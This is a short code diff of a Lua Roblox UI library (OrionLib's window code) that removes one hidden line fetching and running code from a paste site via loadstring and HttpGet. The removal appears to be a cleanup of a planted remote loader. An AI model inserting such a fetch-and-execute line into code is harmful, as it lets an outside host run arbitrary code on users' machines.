@@ -1665,7 +1665,6 @@ function OrionLib:MakeWindow(WindowConfig)
 				SectionFunction[i] = v 
 			end
 			return SectionFunction
-			loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
 		end	
 
 		for i, v in next, GetElements(Container) do
